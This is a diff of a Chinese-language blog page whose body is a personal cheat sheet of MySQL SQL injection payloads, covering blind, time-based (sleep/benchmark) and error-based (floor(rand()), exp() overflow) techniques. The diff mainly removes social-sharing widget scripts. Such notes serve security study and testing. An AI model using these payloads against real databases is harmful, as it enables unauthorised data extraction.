@@ -7,8 +7,7 @@
   <meta name="author" content="SeaFood">
   
   <meta name="description" content="笔记
-一些会用到的payload收集起来避免临时去找不定期更新
-sqli盲注select username from user where username like binary(0x66);   binary() 将十六进制0x或二进制0b转为字符串select 1 from (select u">
+一些会用到的payload收集起来避免临时去找不定期更新">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -65,6 +64,7 @@ sqli盲注select username from user where username like binary(0x66);   binary()
       
         <h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><hr>
 <p>一些会用到的payload收集起来避免临时去找不定期更新</p>
+<a id="more"></a>
 <h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>select username from user where username like binary(0x66);   binary() 将十六进制0x或二进制0b转为字符串<br>select 1 from (select username from user where username=’’);<br>where username between ‘a’ and ‘z’   between 0x61 and 0x7a<br>wherer username regexp ‘’;<br>mid() left() substr() substring() ascii() ord() strcmp(left(‘password’,1), 0x70) = 0</p>
 <h3 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h3><p>if( length(database())&gt;4, sleep(0),sleep(5));<br>if( 1=mid( lpad(  bin( ord(  mid(  select @@version  1,1)  )  )   ,8,0)   ,1,1), sleep(0), sleep(5));<br>benchmark() 执行次数 执行动作</p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>SELECT 1 FROM (select count(<em>),concat(floor(rand(0)</em>2),(select concat(0x20,(select username from user limit 0,1),0x20,user(),0x20,version())))a from information_schema.tables group by a)b;<br>select exp(~(select*from(select user())x));  ~取反 exp溢出报错<br><a href="http://blackfan.ru/mysql_game_v2/" target="_blank" rel="external">http://blackfan.ru/mysql_game_v2/</a>  </p>
@@ -92,23 +92,6 @@ sqli盲注select username from user where username like binary(0x66);   binary()
         
         
         
-  <div class="addthis addthis_toolbox addthis_default_style">
-    
-      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
-    
-    
-      <a class="addthis_button_tweet"></a>
-    
-    
-      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
-    
-    
-      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
-    
-    <a class="addthis_counter addthis_pill_style"></a>
-  </div>
-  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
-
       
       <div class="clearfix"></div>
     </footer>
@@ -119,20 +102,6 @@ sqli盲注select username from user where username like binary(0x66);   binary()
 <section id="comment">
   <h1 class="title">Kommentare</h1>
 
-  
-      <div id="fb-root"></div>
-<script>
-  (function(d, s, id) {
-    var js, fjs = d.getElementsByTagName(s)[0];
-    if (d.getElementById(id)) return;
-    js = d.createElement(s); js.id = id;
-    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
-    fjs.parentNode.insertBefore(js, fjs);
-  }(document, 'script', 'facebook-jssdk'));
-</script>
-
-<div class="fb-comments" data-href="https://5eafood.github.io/2017/03/22/Some-Notes/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
-      
   
 </section>
 
